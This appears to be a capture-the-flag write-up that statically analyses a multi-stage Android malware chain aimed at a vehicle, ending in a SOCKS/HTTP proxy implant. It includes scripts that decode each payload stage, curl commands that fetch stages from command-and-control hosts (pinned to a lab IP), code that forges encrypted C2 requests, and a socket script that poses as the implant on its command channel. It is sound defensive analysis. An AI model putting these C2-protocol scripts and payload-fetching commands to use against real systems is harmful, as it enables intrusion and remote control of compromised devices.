assert len(raw) > 22
message_id = raw[:4]
task_id = raw[4:14]
interval_hex = raw[14:22]
assert message_id == "0500"
assert len(task_id) == 10
assert all(c in "0123456789ABCDEF" for c in interval_hex)

# Android Base64 flag 8 uses the URL-safe alphabet but may retain wrapping.
encoded = "".join(raw[22:].split())
payload = json.loads(base64.urlsafe_b64decode(encoded).decode("utf-8"))
Path("command.json").write_text(
    json.dumps(payload, separators=(",", ":")), encoding="utf-8"
)
print("message_id =", message_id)
print("task_id   =", task_id)
print("interval  =", int(interval_hex, 16))
print(json.dumps(payload, indent=2))
```

```sh
python3 decode_0500.py
```

The decoded object contains the selected APK URL and these authentic identity fields:

```json
{
  "package": "com.tw.jar1",
  "flag": 12,
  "key": "6c2e34b30da42085240ede53ab6107d4"
}
```

It also sets the initial-install and silent-install choices. Extract the URL from the saved JSON, then pin its host to the spawned instance:

```sh
OTA_URL="$(jq -r '.path' command.json)"
OTA_HOST="$(python3 -c 'import sys,urllib.parse; print(urllib.parse.urlsplit(sys.argv[1]).hostname)' "$OTA_URL")"
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$OTA_HOST:80:$LAB_IP" \
  "$OTA_URL" -o JarService.apk
```

Never omit `--resolve` for an evidence-derived hostname. Verify before decompiling:

```sh
stat -c '%s bytes' JarService.apk
md5sum JarService.apk
sha256sum JarService.apk
apkanalyzer manifest application-id JarService.apk
apkanalyzer manifest version-code JarService.apk
```

Expected identity:

```text
Size:   38,095 bytes
MD5:    6c2e34b30da42085240ede53ab6107d4
SHA256: 8e48cca62de5d69f29da5326827e2b0635630c99536e42399b62ff69755a1c4c
Package: com.tw.jar1
Version: V1.12 / versionCode 12
```

**Answer:**

```text
com.tw.jar1:12:6c2e34b30da42085240ede53ab6107d4
```

### 6. What reflective entry point and campaign channel are recovered from the delivered application? Answer in the format `CLASS.METHOD:CHANNEL`.

**Analysis:**

Decode the APK without running it:

```sh
jadx --show-bad-code -d jarservice-jadx JarService.apk
apktool d -f -o jarservice-apktool JarService.apk
```

`App.onCreate()` invokes the outer worker. The four bytes `50 55 56 5d` are XORed with the first four ASCII bytes of `beed72`, producing `2039`. The worker reconstructs serialized metadata whose Java modified-UTF strings name `com.c.j.qbh` and `wa`, then reflectively invokes:

```java
// com.x.zg.ifz
byte[] channel = new byte[]{80, 85, 86, 93};
for (int i = 0; i < channel.length; i++) {
    channel[i] ^= "beed72".charAt(i % 6);
}
m1k(context, new String(channel));

// com.x.zg.RunnableC0002b
Class<?> target = loader.loadClass(metadata.className);
target.getMethod(metadata.methodName, Context.class, String.class)
      .invoke(target, appContext, channelString);
```

```text
com.c.j.qbh.wa(ApplicationContext, "2039")
```

**Answer:**

```text
com.c.j.qbh.wa:2039
```

### 7. What is the SHA-256 of the next executable stage reconstructed from the delivered application?

**Analysis:**

Thirty static arrays reside in `com.x.zg.c` through `com.x.zg.l`, three per class. In declared order, block index `i` is XORed with `30-i` for zero-based `i`. The first 29 arrays are 500 bytes; the last is exactly 151 bytes. Some DEX tools expose an alignment zero after that odd-length payload. It is not part of the Java array and must not be retained.

The decompiled reconstruction loop explains both the XOR schedule and the 25-byte metadata prefix:

```java
byte[][] blocks = {c.b, c.c, c.d, d.b, /* ... */, l.b, l.c, l.d};
ByteArrayOutputStream decoded = new ByteArrayOutputStream();
for (int i = 0; i < 30; i++) {
    for (int j = 0; j < blocks[i].length; j++) {
        decoded.write(blocks[i][j] ^ (30 - i));
    }
}

DataInputStream in = new DataInputStream(
    new ByteArrayInputStream(decoded.toByteArray()));
metadata.version   = in.readFloat();
metadata.reserved  = in.readInt();
metadata.className = in.readUTF();
metadata.methodName = in.readUTF();
// Every remaining byte is written as the loader JAR.
```

The following parser reads apktool's smali declarations, not executable code:

```python
# recover_loader.py
import hashlib
import re
import struct
from pathlib import Path

ROOT = Path("jarservice-apktool/smali/com/x/zg")

def u8(token: str) -> int:
    token = token.strip()
    assert token.endswith("t")
    return int(token[:-1], 0) & 0xff

blocks = []
for class_name in "cdefghijkl":
    text = (ROOT / f"{class_name}.smali").read_text(encoding="utf-8")
    for index in range(3):
        match = re.search(
            rf":array_{index}\s+\.array-data 1\s+(.*?)\s+\.end array-data",
            text,
            flags=re.S,
        )
        assert match
        blocks.append(bytes(u8(line) for line in match.group(1).splitlines() if line.strip()))

assert len(blocks) == 30
assert [len(x) for x in blocks] == [500] * 29 + [151]
serialized = b"".join(
    bytes(value ^ (30 - index) for value in block)
    for index, block in enumerate(blocks)
)
assert len(serialized) == 14651

version, unused = struct.unpack_from(">fI", serialized, 0)

def read_utf(data: bytes, offset: int):
    size = int.from_bytes(data[offset:offset + 2], "big")
    start, end = offset + 2, offset + 2 + size
    return data[start:end].decode("utf-8"), end

class_name, offset = read_utf(serialized, 8)
method_name, offset = read_utf(serialized, offset)
loader = serialized[offset:]
Path("loader-v1.7.jar").write_bytes(loader)

print("container version =", version)
print("unused integer    =", unused)
print("entry             =", f"{class_name}.{method_name}")
print("header bytes      =", serialized[:offset].hex())
print("loader size       =", len(loader))
print("loader MD5        =", hashlib.md5(loader).hexdigest())
print("loader SHA256     =", hashlib.sha256(loader).hexdigest())
```

```sh
python3 recover_loader.py
unzip -t loader-v1.7.jar
```

The 25-byte header is:

```text
3f99999a00000001000b636f6d2e632e6a2e71626800027761
```

The remainder is exactly 14,626 bytes:

```text
MD5:    e9f3a0dab6949ce2cddab9e0aa80ae1a
SHA256: cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c
```

**Answer:**

```text
cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c
```

### Preparation for Questions 8 through 11

Extract and decompile the loader without loading its classes:

```sh
unzip -p loader-v1.7.jar classes.dex > loader.dex
jadx --show-bad-code -d loader-jadx loader.dex
apktool d -f -o loader-apktool loader-v1.7.jar
```

If the local apktool does not accept this DEX-in-JAR form, disassemble the DEX with baksmali and use its output as `loader-smali`:

```sh
java -jar baksmali.jar disassemble loader.dex -o loader-smali
```

The loader embeds two different RSA key roles. Extracting key bytes is static data processing, not key abuse: the keys authenticate only the contained challenge exchange.

```python
# extract_loader_keys.py
import re
from pathlib import Path

paths = [
    Path("loader-apktool/smali/com/c/j/r.smali"),
    Path("loader-smali/com/c/j/r.smali"),
]
path = next(path for path in paths if path.exists())
text = path.read_text(encoding="utf-8")
arrays = []
for body in re.findall(r"\.array-data 1\s+(.*?)\s+\.end array-data", text, re.S):
    values = []
    for line in body.splitlines():
        token = line.strip()
        if token:
            assert token.endswith("t")
            values.append(int(token[:-1], 0) & 0xff)
    arrays.append(bytes(values))

assert [len(x) for x in arrays[:2]] == [162, 633]
Path("loader-request-public.der").write_bytes(arrays[0])
Path("loader-response-private.der").write_bytes(arrays[1])
```

```sh
python3 extract_loader_keys.py
sha256sum loader-request-public.der loader-response-private.der
```

Expected key identities:

```text
loader request public SPKI:  44a11d6543f84aa3df45caed5956e70b62ffe6ba3bb897000f9ef7f58715903a
loader response private key: 6647c090559b21f7858c0fabf447930ea802749fdb36b1b5b55cf367b2338085
```

The request public and response private keys have different moduli. The client contains no private half for decrypting arbitrary requests. The lab therefore validates request framing opaquely and returns a response encryptable to the client's separate response key.

Use one generic helper for both loader and Stage-3 RSA blocks:

```python
# rsa_blocks.py
import sys
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding

mode, key_path, input_path, output_path = sys.argv[1:]
key_data = Path(key_path).read_bytes()
source = Path(input_path).read_bytes()

if mode == "encrypt":
    key = serialization.load_der_public_key(key_data)
    output = b"".join(
        key.encrypt(source[i:i + 117], padding.PKCS1v15())
        for i in range(0, len(source), 117)
    )
elif mode == "decrypt":
    assert source and len(source) % 128 == 0
    key = serialization.load_der_private_key(key_data, password=None)
    output = b"".join(
        key.decrypt(source[i:i + 128], padding.PKCS1v15())
        for i in range(0, len(source), 128)
    )
else:
    raise SystemExit("mode must be encrypt or decrypt")

Path(output_path).write_bytes(output)
```

### 8. Which version does the reconstructed stage identify itself as when contacting its update infrastructure?

**Analysis:**

The outer serialized header contains float `1.2`, but the loader neither uses it as its update version nor calls itself 1.2. Inside the recovered loader, the request builder returns literal `1.7` when `.ver` is absent, unreadable, or has no first line. The selected downloaded wrapper later advertises `3.68`.

```java
// com.c.j.m (JADX name C0012m)
private static final String fallback = decode(":7@", 9); // "1.7"

public static String readVersion(Context context) {
    String line = null;
    File versionFile = new File(loaderDirectory(context), ".ver");
    if (versionFile.exists()) {
        line = new BufferedReader(new InputStreamReader(
            new FileInputStream(versionFile))).readLine();
    }
    return line != null ? line : fallback;
}
```

```text
JarService container metadata: 1.2
Loader baseline/fallback:       1.7
Selected Stage-3:               3.68
```

**Answer:**

```text
1.7
```

### 9. Which API endpoint is concealed in the reconstructed stage's generated update request?

**Analysis:**

The loader rotates among four built-in update bases. Unless a value contains literal `dex_api.txt`, it appends `/apiv2/<token>`. Static call-site analysis shows that the token's inner plaintext is independent of the RSA request JSON.

The algorithm uses a five-digit decimal value for the first repeating XOR, then wraps the inner hex with a ten-digit epoch and applies a second repeating XOR with `Mu^38Ydeo233Uowd`:

```java
// com.c.j.n (JADX name C0013n)
long epoch = System.currentTimeMillis() / 1000;
int random = new Random().nextInt(90000) + 10000;
String inner = hex(xor(plaintext, String.valueOf(random)));
String frame = inner + "|" + epoch + "|" + random;
String token = hex(xor(frame, "Mu^38Ydeo233Uowd"));
return baseUrl + "/apiv2/" + token;
```

```python
# make_loader_token.py
import time

def xor(value: bytes, key: bytes) -> bytes:
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(value))

plaintext = b"/api/rsaUpdate"
random_text = b"12345"                 # valid deterministic five-digit choice
epoch = str(int(time.time())).encode() # ten decimal digits in 2026
inner = xor(plaintext, random_text).hex().encode()
frame = inner + b"|" + epoch + b"|" + random_text
token = xor(frame, b"Mu^38Ydeo233Uowd").hex()
assert len(token) == 90
print(token)
```

Reversing the two operations reveals the fixed plaintext.

**Answer:**

```text
/api/rsaUpdate
```

### 10. What host-independent path identifies the next object returned by the update service?

**Analysis:**

Create an authentic-shaped compact request. These safe fixture values do not claim to be a real device identity:

```python
import json
from pathlib import Path

request = {
    "userId": "00000000-0000-3000-8000-000000000000",
    "dexVersion": "1.7",
    "dexType": 1,
    "channelId": "2039",
    "packageName": "com.tw.jar1",
    "appVersion": 12,
    "appName": "JarService",
}
Path("loader-request.json").write_text(
    json.dumps(request, separators=(",", ":")), encoding="utf-8"
)
```

Encrypt it in 117-byte plaintext chunks, generating raw 128-byte RSA blocks:

```sh
python3 rsa_blocks.py encrypt \
  loader-request-public.der loader-request.json loader-request.bin
TOKEN="$(python3 make_loader_token.py)"
UPDATE_HOST='a1.xshaon123.sbs'
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$UPDATE_HOST:80:$LAB_IP" \
  -H 'Content-Type:' -H 'Expect:' \
  --data-binary @loader-request.bin \
  "http://$UPDATE_HOST/apiv2/$TOKEN" \
  -o loader-response.bin
python3 rsa_blocks.py decrypt \
  loader-response-private.der loader-response.bin loader-response.json
jq . loader-response.json
```

`a1.xshaon123.sbs` is never resolved externally: `--resolve` sends this request only to `$LAB_IP`. The decrypted object has code 200, status 0, version 3.68, and a `dexUrl`. The organizer hostname is deployment-dependent, so only its path is stable.

**Answer:**

```text
/vr34der34/dex3.68.png
```

### 11. What is the SHA-256 of the executable archive recovered from that object?

**Analysis:**

Download the URL from the decrypted response, again pinning it to the spawned instance:

```sh
DEX_URL="$(jq -r '.data.dexUrl' loader-response.json)"
DEX_HOST="$(python3 -c 'import sys,urllib.parse; print(urllib.parse.urlsplit(sys.argv[1]).hostname)' "$DEX_URL")"
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$DEX_HOST:80:$LAB_IP" \
  "$DEX_URL" -o stage3.wrapper
stat -c '%s bytes' stage3.wrapper
sha256sum stage3.wrapper
```

The exact wrapper is 59,379 bytes, MD5 `7560557e72a59e89b68c2a51a957c107`, SHA-256 `2318cb7db721d2465acc94d1708b353529d984f5b1f97298eb56ec3b8f537aab`. Its format is:

```text
offset 0:   signed byte, value 1
offset 1:   big-endian float32, bytes 40 6b 85 1f, value about 3.68
offset 5:   JAR bytes XOR low byte of int(float32 * 100)
```

The loader's decoder confirms that the float is both version metadata and the source of the byte-wise XOR key:

```java
DataInputStream in = new DataInputStream(downloadedObject);
byte wrapperVersion = in.readByte();
int xorKey = (int) (in.readFloat() * 100.0f);
while ((count = in.read(buffer)) != -1) {
    for (int i = 0; i < count; i++) {
        buffer[i] = (byte) (buffer[i] ^ xorKey);
    }
    jar.write(buffer, 0, count);
}
```

Decode it as inert bytes:

```python
# decode_stage3.py
import hashlib
import struct
import zipfile
from pathlib import Path

wrapper = Path("stage3.wrapper").read_bytes()
kind = struct.unpack(">b", wrapper[:1])[0]
version = struct.unpack(">f", wrapper[1:5])[0]
key = int(version * 100) & 0xff
stage3 = bytes(byte ^ key for byte in wrapper[5:])
Path("stage3-v3.68.jar").write_bytes(stage3)

assert kind == 1
assert key == 0x70
assert zipfile.is_zipfile("stage3-v3.68.jar")
print("kind =", kind, "version =", version, "key =", hex(key))
print("size =", len(stage3))
print("MD5 =", hashlib.md5(stage3).hexdigest())
print("SHA256 =", hashlib.sha256(stage3).hexdigest())
```

```sh
python3 decode_stage3.py
unzip -t stage3-v3.68.jar
```

Expected decoded identity:

```text
Size:   59,374 bytes
MD5:    67dc78e544ebce16b85dc7c195dfbc58
SHA256: 79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d
```

**Answer:**

```text
79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d
```

### Preparation for Questions 12 through 16

Decompile the earned Stage-3 archive statically:

```sh
unzip -p stage3-v3.68.jar classes.dex > stage3.dex
jadx --show-bad-code -d stage3-jadx stage3.dex
```

The two Stage-3 RSA arrays are visible in `stage3-jadx/sources/com/a/b/a/bb.java`. Extract them without loading a class:

```python
# extract_stage3_keys.py
import re
from pathlib import Path

source = Path("stage3-jadx/sources/com/a/b/a/bb.java").read_text(encoding="utf-8")
arrays = {}
for name, body in re.findall(r"byte\[\] ([ab]) = \{([^}]+)\}", source):
    arrays[name] = bytes(int(token.strip()) & 0xff for token in body.split(","))

assert len(arrays["a"]) == 162
assert len(arrays["b"]) == 634
Path("stage3-request-public.der").write_bytes(arrays["a"])
Path("stage3-response-private.der").write_bytes(arrays["b"])
```

```sh
python3 extract_stage3_keys.py
sha256sum stage3-request-public.der stage3-response-private.der
```

Expected identities:

```text
Stage-3 request public SPKI:  dea1584c88d187430a01f4ee2aa88e5135f1b7532fc0220003aeb2800a5c7e1e
Stage-3 response private key: 970355a37c5fe6255aea4b004daf99ac0dac6a2ded97dff4c96243c7444de354
```

Again, the moduli differ. The simulator can return client-decryptable responses but cannot and does not claim to decrypt real client telemetry.

### 12. What is the first configuration request-target generated by the recovered control stage?

**Analysis:**

The initial configuration version embedded in this Stage-3 is `3.8`; do not confuse it with the replayed response's `3.82`. The channel is inherited from JarService. Static control-flow and decoded string analysis produce this exact request-target, including query order and case:

```java
// com.ast.sdk.a, with aq.a(...) literals decoded
String target = updateBase
    + "/api/init?configVersion="
    + ap.b                         // embedded value: 3.8
    + "&rsa=1&channelId="
    + channel;                    // inherited value: 2039
p response = http.get(target, null);
if (response.status == 200) {
    be.a(context, new String(bb.decrypt(response.body)));
}
```

```text
/api/init?configVersion=3.8&rsa=1&channelId=2039
```

Retrieve its contained response via an authentic built-in HTTP identity pinned to the instance:

```sh
CONFIG_HOST='a1.xshaon123.sbs'
CONFIG_TARGET='/api/init?configVersion=3.8&rsa=1&channelId=2039'
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$CONFIG_HOST:80:$LAB_IP" \
  "http://$CONFIG_HOST$CONFIG_TARGET" \
  -o stage3-config.bin
python3 rsa_blocks.py decrypt \
  stage3-response-private.der stage3-config.bin stage3-config.json
jq . stage3-config.json
```

The result is a code-100 configuration update. It supplies organizer-owned task and update hosts, task path `/cpc/api/task`, interval 5,500,000 ms, and configuration version 3.82.

**Answer:**

```text
/api/init?configVersion=3.8&rsa=1&channelId=2039
```

### 13. Which UID is assigned to the implant by the registration service?

**Analysis:**

Take the first task base from the decrypted configuration and pin it to the spawned IP:

```sh
C2_URL="$(jq -r '.data.hosts[0]' stage3-config.json)"
C2_HOST="$(python3 -c 'import sys,urllib.parse; print(urllib.parse.urlsplit(sys.argv[1]).hostname)' "$C2_URL")"
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$C2_HOST:80:$LAB_IP" \
  "http://$C2_HOST/cpc/api/proxy/origin" \
  -o registration.json
jq . registration.json
```

Registration is plaintext JSON, unlike the config and task responses:

```json
{"code":200,"data":"00005bp"}
```

**Answer:**

```text
00005bp
```

This UID is a historical replay value, not a string hardcoded in sh66.

### 14. Which product, task, and version tuple is assigned to the implant? Answer in the format `PRODUCT_ID:TASK_ID:VERSION`.

**Analysis:**

The real client builds a large device/app object and encrypts compact UTF-8 JSON with the Stage-3 request public key. The contained server lacks the matching private key, so it truthfully validates only bounded RSA block structure. A small safe, authentic-shaped request is sufficient:

```python
import json
from pathlib import Path

request = {
    "absDevice": {"uid": "00005bp"},
    "appInfo": {
        "packageName": "com.tw.jar1",
        "appName": "JarService",
        "versionName": "L_1.0",
        "versionCode": "12",
    },
    "channelId": 2039,
    "dexVersion": "3.68",
    "configVersion": "3.82",
}
Path("stage3-task-request.json").write_text(
    json.dumps(request, separators=(",", ":")), encoding="utf-8"
)
```

```sh
python3 rsa_blocks.py encrypt \
  stage3-request-public.der stage3-task-request.json stage3-task-request.bin
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$C2_HOST:80:$LAB_IP" \
  -H 'Content-Type: application/octet-stream' -H 'Expect:' \
  --data-binary @stage3-task-request.bin \
  "http://$C2_HOST/cpc/api/task" \
  -o stage3-task-response.bin
python3 rsa_blocks.py decrypt \
  stage3-response-private.der stage3-task-response.bin stage3-task-response.json
jq . stage3-task-response.json
```

The 118-byte plaintext spans two response blocks: 117 bytes in the first and one byte in the second. The selected task is:

```json
{
  "productId": 4532,
  "taskId": 34337681,
  "version": 1787907664,
  "rank": 10
}
```

**Answer:**

```text
4532:34337681:1787907664
```

### 15. Which script operation delivers the final module, and which field supplies its location? Answer in the format `TAG:FIELD`.

**Analysis:**

Fetch the plaintext XML route named by the task:

```sh
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$C2_HOST:80:$LAB_IP" \
  "http://$C2_HOST/cpc/api/xml?productId=4532" \
  -o stage3-xml.json
```

Despite the route name, the response is JSON. Its `script` member is itself a JSON string, so parse twice:

```python
# parse_script.py
import json
from pathlib import Path

outer = json.loads(Path("stage3-xml.json").read_text(encoding="utf-8"))
script = json.loads(outer["data"][0]["script"])
Path("module-script.json").write_text(json.dumps(script, indent=2), encoding="utf-8")
print("tagName =", script["tagName"])
print("url     =", script["url"])
print("url2    =", script["url2"])
print("class   =", script["className"])
print("method  =", script["method"])
print("params  =", script["params"])
```

```sh
python3 parse_script.py
```

Static analysis of the Stage-3 dispatcher is necessary to interpret this object. In v3.68:

- `loadlib` and `loadlib3` are inert stubs;
- `loadlib2` is the active download/reflection path;
- it consumes `url`;
- `url2`, `md52`, and `loadType` are ignored by this implementation; and
- the supplied MD5 is used as a cache/file key, not checked against the downloaded content.

The `loadlib2` parser and worker make the field choice explicit after decoding the small subtract-shift string helper:

```java
// com.a.b.a.bn
public void parse() {
    this.url       = (String) value("url");
    this.md5       = (String) value("md5");
    this.params    = (JSONArray) value("params");
    this.className = (String) value("className");
    this.method    = (String) value("method");
    this.thread    = ((Boolean) value("thread")).booleanValue();
    this.reload    = ((Boolean) value("reload")).booleanValue();
}

if (!cachedFile.exists()) {
    downloader.download(task.url, directory, task.md5);
}
Class<?> loaded = new DexClassLoader(readOnlyCopy, optimizedDirectory,
        null, ClassLoader.getSystemClassLoader()).loadClass(task.className);
Method entry = loaded.getMethod(task.method, parameterTypes);
entry.invoke(loaded, arguments);
```

There is no read of `url2` in this active path. That is why merely choosing the first URL-looking field would select the wrong module.

**Answer:**

```text
loadlib2:url
```

### 16. What is the SHA-256 of the final downloaded module?

**Analysis:**

Use only the active `url` and pin it to the lab:

```sh
MODULE_URL="$(jq -r '.url' module-script.json)"
MODULE_HOST="$(python3 -c 'import sys,urllib.parse; print(urllib.parse.urlsplit(sys.argv[1]).hostname)' "$MODULE_URL")"
curl --fail --silent --show-error --noproxy '*' \
  --resolve "$MODULE_HOST:80:$LAB_IP" \
  "$MODULE_URL" -o sh66.io
stat -c '%s bytes' sh66.io
md5sum sh66.io
sha256sum sh66.io
```

Expected identity:

```text
Size:   26,135 bytes
MD5:    71ab5517f71866279d0d87d37f2ae320
SHA256: 906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963
```

**Answer:**

```text
906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963
```

### 17. What is the DEX method descriptor, containing only the parameter and return types, of the module entry point invoked by the control stage?

**Analysis:**

Treat the `.io` file as a DEX-bearing JAR and inspect it statically:

```sh
unzip -t sh66.io
unzip -p sh66.io classes.dex > sh66.dex
jadx --show-bad-code -d sh66-jadx sh66.dex
dexdump -d sh66.dex > sh66-dexdump.txt
rg -n 'com\.miyc\.transfer\.Client|start' sh66-dexdump.txt sh66-jadx
```

DEX proves this public static method:

```java
// com.miyc.transfer.Client
public static void start(
        Context context, String host, String mode,
        int commandPort, int dataPort, int udpPort, int heartbeatMs) {
    if (mode.equals("off") && isMobile(context)) {
        return;
    }
    start(new k(), host, mode,
          commandPort, dataPort, udpPort, heartbeatMs);
}
```

```text
com.miyc.transfer.Client.start(
    Context, String, String, int, int, int, int
)
```

The exact DEX descriptor is:

**Answer:**

```text
(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;IIII)V
```

### 18. Which four integer values are passed to the final module entry point? Answer as comma-separated integers in invocation order.

**Analysis:**

Follow each argument into socket construction and timer code. The direction is easy to misread: these are destinations for connections made **outward** by sh66, not victim-side public listeners.

```java
// Client.start(t, host, mode, command, data, udp, heartbeat)
if (!mode.equals("DEBUG")) {
    new Thread(new a(uidBridge, udpPort)).start();
}
new Thread(new b(mode, uidBridge, host,
                 commandPort, dataPort, heartbeatMs)).start();

// coordinator worker a.run()
g.m = udpPort;

// command channel e
this.commandPort = commandPort;
this.dataPort = dataPort;
this.heartbeatMs = heartbeatMs;
socket.connect(new InetSocketAddress(host, commandPort), 10000);
```

| Value | Binary-proven role |
| ---: | --- |
| 9999 | remote TCP primary command destination |
| 7777 | remote TCP data destination for commanded sessions |
| 8888 | remote UDP relay endpoint used by SOCKS UDP ASSOCIATE |
| 20000 | heartbeat interval in milliseconds; stale threshold uses three intervals |

The only relevant victim-local server sockets are coordinator/bridge internals on 10121 and 12101; they are not public C2 roles.

**Answer:**

```text
9999,7777,8888,20000
```

### 19. What authentication frame does the module send when opening its primary command channel? Provide the frame in hexadecimal.

**Analysis:**

The command channel starts with:

```java
// com.miyc.transfer.u
public static byte[] frame(byte marker, byte[] uid) {
    byte[] out = new byte[uid.length + 9];
    out[0] = marker;
    System.arraycopy(u32be(66), 0, out, 1, 4);
    System.arraycopy(u32be(uid.length), 0, out, 5, 4);
    System.arraycopy(uid, 0, out, 9, uid.length);
    return out;
}

// com.miyc.transfer.e
this.authentication = frame((byte) 0x33, uid.getBytes());
```

```text
0x33 | u32(module version) | u32(UID byte length) | UID bytes
```

All integers are network byte order. Confirm the exact bytes independently:

```python
import struct

uid = b"00005bp"
frame = b"\x33" + struct.pack(">II", 66, len(uid)) + uid
assert len(frame) == 16
print(frame.hex())
```

**Answer:**

```text
33000000420000000730303030356270
```

The frame is 16 bytes: one marker, two four-byte integers, and seven UID bytes.

### 20. The final proxy task repurposes the compromised vehicle for a follow-on operation. At what coordinates was the relay parked? Answer in the format `LATITUDE,LONGITUDE`.

**Analysis:**

The recovered module shows how to follow an HTTP proxy command without executing it. The primary command frame is 17 bytes:

```text
command[1] | token[4] | reserved[4] | data-address[8]
```

After sending the authentication frame from Question 19 to TCP/9999, read the command frame. Opcode `0x30` selects the HTTP handler. Preserve its four-byte token and open the secondary channel on TCP/7777:

```python
import socket

host = "<SPAWN_IP>"
auth = bytes.fromhex("33000000420000000730303030356270")

def take(sock, size):
    data = b""
    while len(data) < size:
        data += sock.recv(size - len(data))
    return data

with socket.create_connection((host, 9999)) as command:
    command.sendall(auth)
    frame = take(command, 17)
    assert frame[0] == 0x30
    token = frame[1:5]

    with socket.create_connection((host, 7777)) as data:
        data.sendall(token)
        request = b""
        while not request.endswith(b"\r\n\r\n"):
            request += data.recv(512)
        print(request.decode())
        data.sendall(
            b"HTTP/1.1 204 No Content\r\n"
            b"Content-Length: 0\r\n"
            b"Connection: close\r\n\r\n"
        )
```

The C2-supplied request enrolls implant UID `00005bp` as a drone-control relay. Its absolute request target contains the location:

```http
GET http://198.51.100.7/relay/enroll?relayId=00005bp&role=drone-control&latitude=51.4997000&longitude=-0.1608000 HTTP/1.1
Host: 198.51.100.7
Connection: close
```

This request is operator tasking carried by the proxy protocol, not a constant patched into the recovered module. The unmodified sh66 module provides the relay capability; the task associates the infected vehicle with the follow-on operation and its parked location.

**Answer:**

```text
51.4997000,-0.1608000
```
